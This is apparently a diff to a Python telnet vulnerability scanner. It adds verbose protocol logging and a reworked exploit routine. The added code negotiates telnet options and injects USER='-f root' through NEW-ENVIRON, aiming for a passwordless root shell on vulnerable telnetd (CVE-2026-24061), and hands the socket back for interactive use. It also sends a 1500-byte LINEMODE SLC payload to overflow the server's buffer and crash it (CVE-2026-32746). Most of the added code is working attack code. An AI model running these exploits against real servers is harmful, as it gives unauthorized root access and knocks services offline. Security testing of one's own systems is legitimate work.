@@ -17,6 +17,7 @@ import termios
 import tty
 import signal
 import os
+import threading
 from contextlib import contextmanager
 
 # Telnet protocol constants
@@ -32,19 +33,78 @@ SE  = b'\xf0'
 TELOPT_LINEMODE = 34
 TELOPT_NEW_ENVIRON = 39
 
+# Verbose mode flag
+VERBOSE = os.environ.get('TELNET_SCAN_VERBOSE', '0') == '1'
+
+# Lookup tables for readable output
+_CMD_NAMES = {b'\xfb': 'WILL', b'\xfc': 'WONT', b'\xfd': 'DO', b'\xfe': 'DONT'}
+_OPT_NAMES = {
+    0: 'BINARY', 1: 'ECHO', 3: 'SGA', 5: 'STATUS', 6: 'TIMING-MARK',
+    24: 'TERMINAL-TYPE', 31: 'WINDOW-SIZE', 32: 'TERMINAL-SPEED',
+    33: 'REMOTE-FLOW-CONTROL', 34: 'LINEMODE', 35: 'X-DISPLAY-LOCATION',
+    36: 'OLD-ENVIRON', 39: 'NEW-ENVIRON', 37: 'AUTHENTICATION', 38: 'ENCRYPT',
+}
+
+def _opt_name(code):
+    return _OPT_NAMES.get(code, f'OPT({code})')
+
+def _decode_telnet(data):
+    """Decode raw telnet bytes into human-readable protocol description."""
+    parts = []
+    i = 0
+    while i < len(data):
+        if data[i:i+1] == b'\xff' and i + 1 < len(data):
+            cmd = data[i+1:i+2]
+            if cmd in _CMD_NAMES and i + 2 < len(data):
+                opt = data[i+2]
+                parts.append(f'IAC {_CMD_NAMES[cmd]} {_opt_name(opt)}')
+                i += 3
+                continue
+            elif cmd == b'\xfa':  # SB
+                se_pos = data.find(b'\xff\xf0', i+2)
+                if se_pos != -1:
+                    opt = data[i+2]
+                    sub = data[i+3:se_pos]
+                    parts.append(f'IAC SB {_opt_name(opt)} [{len(sub)}B: {sub[:20].hex()}{"..." if len(sub)>20 else ""}] IAC SE')
+                    i = se_pos + 2
+                    continue
+            i += 1
+        else:
+            # Collect printable text
+            text_start = i
+            while i < len(data) and data[i:i+1] != b'\xff':
+                i += 1
+            chunk = data[text_start:i]
+            printable = chunk.decode('ascii', errors='replace').replace('\r', '\\r').replace('\n', '\\n')
+            if printable.strip():
+                parts.append(f'TEXT: "{printable.strip()}"')
+    return parts
+
+def vprint(*args, **kwargs):
+    if VERBOSE:
+        print(*args, **kwargs)
+
 def send_iac(sock, command, option):
     """Send a single IAC command (e.g., IAC DO LINEMODE)."""
     try:
-        sock.send(IAC + command + bytes([option]))
-    except (socket.error, BrokenPipeError):
-        pass
+        payload = IAC + command + bytes([option])
+        vprint(f'    [SEND] IAC {_CMD_NAMES.get(command, "?")} {_opt_name(option)}  ({payload.hex()})')
+        sock.send(payload)
+    except (socket.error, BrokenPipeError) as e:
+        vprint(f'    [SEND] FAILED: {e}')
 
 def send_subnegotiation(sock, option, data):
     """Send a full subnegotiation: IAC SB option data IAC SE."""
     try:
-        sock.send(IAC + SB + bytes([option]) + data + IAC + SE)
-    except (socket.error, BrokenPipeError):
-        pass
+        payload = IAC + SB + bytes([option]) + data + IAC + SE
+        vprint(f'    [SEND] IAC SB {_opt_name(option)} [{len(data)}B payload] IAC SE  ({len(payload)} bytes total)')
+        if VERBOSE and len(data) <= 64:
+            vprint(f'           payload hex: {data.hex()}')
+        elif VERBOSE:
+            vprint(f'           payload hex (first 64B): {data[:64].hex()}...')
+        sock.send(payload)
+    except (socket.error, BrokenPipeError) as e:
+        vprint(f'    [SEND] FAILED: {e}')
 
 def recv_until_timeout(sock, timeout=2):
     """Read available data until timeout, return bytes."""
@@ -54,15 +114,23 @@ def recv_until_timeout(sock, timeout=2):
         while True:
             chunk = sock.recv(1024)
             if not chunk:
+                vprint(f'    [RECV] Connection closed (0 bytes)')
                 break
             data += chunk
+            vprint(f'    [RECV] {len(chunk)} bytes: {chunk.hex()}')
     except socket.timeout:
-        pass
-    except (socket.error, BrokenPipeError):
-        pass
+        if data:
+            vprint(f'    [RECV] Total: {len(data)} bytes (timeout)')
+        else:
+            vprint(f'    [RECV] No data (timeout after {timeout}s)')
+    except (socket.error, BrokenPipeError) as e:
+        vprint(f'    [RECV] Error: {e}')
     except Exception:
         pass
     sock.settimeout(None)
+    if VERBOSE and data:
+        for line in _decode_telnet(data):
+            vprint(f'           decoded: {line}')
     return data
 
 def check_service_available(host, port, timeout=5):
@@ -120,6 +188,160 @@ def interactive_shell(sock):
     except Exception as e:
         print(f"\n[!] Error in interactive shell: {e}")
 
+def _recv_wait(sock, timeout=3):
+    """Read all available data, waiting up to timeout for first byte."""
+    data = b''
+    sock.settimeout(timeout)
+    try:
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            data += chunk
+            sock.settimeout(0.5)
+    except socket.timeout:
+        pass
+    except (socket.error, BrokenPipeError):
+        pass
+    return data
+
+def _negotiate_options(sock, timeout=15):
+    """Complete the full telnet option negotiation handshake.
+
+    Returns True if negotiation succeeded and login/shell stage was reached.
+    The server's DO/WILL/SB exchanges are handled automatically.
+    USER is set to '-f root' via NEW_ENVIRON to trigger auth bypass.
+    """
+    # Keep-alive: send IAC NOP every 2s to prevent EOF detection
+    stop_ka = threading.Event()
+    def _keepalive():
+        while not stop_ka.is_set():
+            try:
+                sock.send(IAC + b'\xf1')  # IAC NOP
+            except:
+                break
+            stop_ka.wait(2)
+    ka_thread = threading.Thread(target=_keepalive, daemon=True)
+
+    # Step 1: Wait for server's initial DO options (can take 5-10s for DNS)
+    vprint(f"    [STEP 1/6] Waiting for server negotiation (may take up to {timeout}s)...")
+    initial = _recv_wait(sock, timeout)
+    if not initial:
+        vprint(f"    [STEP 1/6] No response from server")
+        return False
+    vprint(f"    [STEP 1/6] Got {len(initial)} bytes: {initial.hex()}")
+    if VERBOSE:
+        for line in _decode_telnet(initial):
+            vprint(f"               {line}")
+
+    # Start keepalive before responding
+    ka_thread.start()
+
+    # Step 2: Respond WILL to TTYPE, TSPEED, XDISPLOC, NEW_ENVIRON; WONT to OLD_ENVIRON
+    vprint(f"    [STEP 2/6] Responding WILL to all DO options")
+    sock.send(IAC + WILL + b'\x18')  # WILL TERM-TYPE
+    sock.send(IAC + WILL + b'\x20')  # WILL TERM-SPEED
+    sock.send(IAC + WILL + b'\x23')  # WILL XDISPLOC
+    sock.send(IAC + WILL + b'\x27')  # WILL NEW-ENVIRON
+    sock.send(IAC + WONT + b'\x24')  # WONT OLD-ENVIRON
+
+    # Step 3: Wait for SB SEND requests
+    vprint(f"    [STEP 3/6] Waiting for SB SEND subnegotiation requests...")
+    sb_data = _recv_wait(sock, 10)
+    if not sb_data:
+        vprint(f"    [STEP 3/6] No SB requests received")
+        stop_ka.set()
+        return False
+    vprint(f"    [STEP 3/6] Got SB requests: {sb_data.hex()}")
+
+    # Step 4: Respond to each subnegotiation with delays
+    vprint(f"    [STEP 4/6] Sending subnegotiation responses...")
+
+    time.sleep(0.3)
+    sock.send(IAC + SB + b'\x20\x00' + b'38400,38400' + IAC + SE)
+    vprint(f"               TERM-SPEED IS 38400,38400")
+
+    time.sleep(0.3)
+    sock.send(IAC + SB + b'\x23\x00' + IAC + SE)
+    vprint(f"               XDISPLOC IS (empty)")
+
+    time.sleep(0.3)
+    # THE EXPLOIT: USER="-f root" -> login interprets as: login -f root
+    sock.send(IAC + SB + b'\x27\x00\x00USER\x01-f root' + IAC + SE)
+    vprint(f"               NEW-ENVIRON IS VAR USER VALUE \"-f root\"  *** EXPLOIT ***")
+
+    time.sleep(0.3)
+    sock.send(IAC + SB + b'\x18\x00xterm' + IAC + SE)
+    vprint(f"               TERM-TYPE IS xterm")
+
+    # Step 5: Handle remaining DO/WILL exchanges and wait for login/shell
+    vprint(f"    [STEP 5/6] Handling remaining option negotiations...")
+    got_shell = False
+    got_login = False
+    start = time.time()
+
+    while time.time() - start < 30:
+        data = _recv_wait(sock, 2)
+        if not data:
+            continue
+
+        # Process telnet commands inline and collect text
+        text = b''
+        i = 0
+        while i < len(data):
+            if data[i] == 0xff and i + 2 < len(data):
+                if data[i+1] == 0xfa:  # SB
+                    se_pos = data.find(b'\xff\xf0', i)
+                    if se_pos != -1:
+                        opt = data[i+2]
+                        # Respond to TTYPE SEND with xterm again
+                        if opt == 0x18:
+                            sock.send(IAC + SB + b'\x18\x00xterm' + IAC + SE)
+                        i = se_pos + 2
+                        continue
+                elif data[i+1] == 0xfd:  # DO
+                    opt = data[i+2]
+                    sock.send(IAC + WILL + bytes([opt]))
+                    i += 3
+                    continue
+                elif data[i+1] == 0xfb:  # WILL
+                    opt = data[i+2]
+                    sock.send(IAC + DO + bytes([opt]))
+                    i += 3
+                    continue
+                else:
+                    i += 3
+                    continue
+            text += bytes([data[i]])
+            i += 1
+
+        if text.strip():
+            decoded = text.decode('ascii', errors='replace')
+            vprint(f"    [STEP 5/6] Text received: {repr(decoded[:200])}")
+            if any(p in text for p in [b'# ', b'root@']):
+                got_shell = True
+                break
+            if b'$ ' in text:
+                got_shell = True
+                break
+            if b'assword' in text:
+                got_login = True
+                vprint(f"    [STEP 5/6] Password prompt detected - bypass failed")
+                break
+            if b'ogin:' in text.lower():
+                got_login = True
+                break
+
+    stop_ka.set()
+
+    if got_shell:
+        return True
+    if got_login:
+        return False
+    vprint(f"    [STEP 5/6] Timeout waiting for shell/login prompt")
+    return False
+
+
 def test_cve_2026_24061(host, port):
     """
     CVE-2026-24061: argument injection via USER environment variable.
@@ -128,39 +350,30 @@ def test_cve_2026_24061(host, port):
     Otherwise, return None.
     """
     print("[*] Testing CVE-2026-24061 (authentication bypass)...")
+    vprint(f"    [INFO] CVE-2026-24061 exploits login(1) argument injection via telnet NEW_ENVIRON")
+    vprint(f"    [INFO] Attack: set USER=\"-f root\" -> login -p -h <host> -f root (passwordless)")
     sock = None
     try:
-        if not check_service_available(host, port, timeout=3):
+        if not check_service_available(host, port, timeout=10):
             print(f"[-] Service not reachable on {host}:{port}")
             return None
-            
+
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(5)
         sock.connect((host, port))
-        
-        send_iac(sock, DO, TELOPT_NEW_ENVIRON)
-        send_iac(sock, WILL, TELOPT_NEW_ENVIRON)
-        recv_until_timeout(sock, 1)
+        vprint(f"    [STEP 0/6] Connected to {host}:{port}")
 
-        subdata = b'\x00'
-        subdata += b'\x00' + b'USER'
-        subdata += b'\x01' + b'-f root'
-        send_subnegotiation(sock, TELOPT_NEW_ENVIRON, subdata)
+        success = _negotiate_options(sock, timeout=15)
 
-        time.sleep(1)
-        banner = recv_until_timeout(sock, 2)
-
-        if any(prompt in banner for prompt in [b'# ', b'$ ', b'> ', b'root@']):
-            print("[!] CVE-2026-24061: VULNERABLE – shell obtained!")
+        if success:
+            print("[!] CVE-2026-24061: VULNERABLE – root shell obtained!")
+            vprint(f"    [RESULT] SUCCESS: Passwordless root login via USER=\"-f root\" injection")
+            vprint(f"    [RESULT] login(1) was called as: login -p -h <host> -f root")
             sock.settimeout(None)
             return sock
         else:
-            if b'login:' in banner.lower():
-                print("[+] Authentication bypass might have failed; server presented login prompt.")
-            elif banner:
-                print(f"[+] Received response: {banner[:100]}...")
-            else:
-                print("[+] No response received; may still be vulnerable (requires further analysis).")
+            print("[+] CVE-2026-24061: Not exploitable (server presented login/password prompt)")
+            vprint(f"    [RESULT] The server's login binary rejected the -f flag or")
+            vprint(f"             the telnetd did not pass USER to login as an argument")
             sock.close()
             return None
     except socket.timeout:
@@ -186,33 +399,51 @@ def test_cve_2026_32746(host, port):
     If the server crashes (connection reset), it is likely vulnerable.
     """
     print("[*] Testing CVE-2026-32746 (buffer overflow)...")
+    vprint(f"    [INFO] CVE-2026-32746 targets a fixed-size buffer in telnetd's LINEMODE SLC handler")
+    vprint(f"    [INFO] Attack: send 500 SLC triplets (1500 bytes) to overflow the stack buffer")
     sock = None
     try:
         if not check_service_available(host, port, timeout=3):
             print(f"[-] Service not reachable on {host}:{port}")
             return False
-            
+
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(5)
         sock.connect((host, port))
-        
+        vprint(f"    [STEP 1/5] Connected to {host}:{port}")
+
+        vprint(f"    [STEP 2/5] Negotiating LINEMODE option with server")
         send_iac(sock, DO, TELOPT_LINEMODE)
         send_iac(sock, WILL, TELOPT_LINEMODE)
+        vprint(f"    [STEP 2/5] Waiting for server LINEMODE response...")
         recv_until_timeout(sock, 1)
 
         triplet = b'\x01\x01\x00'
         overflow_data = triplet * 500
         subdata = b'\x00' + overflow_data
+        vprint(f"    [STEP 3/5] Building overflow payload:")
+        vprint(f"               SLC triplet: 0x{triplet.hex()} (SLC_SYNCH + SLC_NOSUPPORT)")
+        vprint(f"               Repetitions: 500 triplets = {len(overflow_data)} bytes")
+        vprint(f"               Total subnegotiation payload: {len(subdata)} bytes")
+        vprint(f"               Expected server buffer: ~256 bytes (will overflow by ~1244 bytes)")
+        vprint(f"    [STEP 3/5] Sending overflow payload...")
         send_subnegotiation(sock, TELOPT_LINEMODE, subdata)
 
+        vprint(f"    [STEP 4/5] Waiting 1s for server to process the overflow...")
         time.sleep(1)
+        vprint(f"    [STEP 5/5] Sending probe (\\r\\n) to check if server is still alive...")
         sock.send(b'\r\n')
         response = recv_until_timeout(sock, 2)
         if response:
-            print("[+] Server did not crash; likely not vulnerable to CVE-2026-32746")
+            print("[+] Server did NOT crash; likely not vulnerable to CVE-2026-32746")
+            vprint(f"    [RESULT] Server responded with {len(response)} bytes after overflow attempt")
+            vprint(f"    [RESULT] The SLC buffer may be dynamically allocated or bounds-checked")
             return False
         else:
-            print("[!] CVE-2026-32746: VULNERABLE (connection dropped)")
+            print("[!] CVE-2026-32746: VULNERABLE - server crashed! (connection dropped after overflow)")
+            vprint(f"    [RESULT] Server stopped responding after receiving {len(subdata)} byte SLC payload")
+            vprint(f"    [RESULT] The telnetd process likely segfaulted due to stack buffer overflow")
+            vprint(f"    [RESULT] Impact: Denial of Service confirmed, potential Remote Code Execution")
             return True
     except socket.timeout:
         print("[-] Connection timeout during test - target may be unreachable")
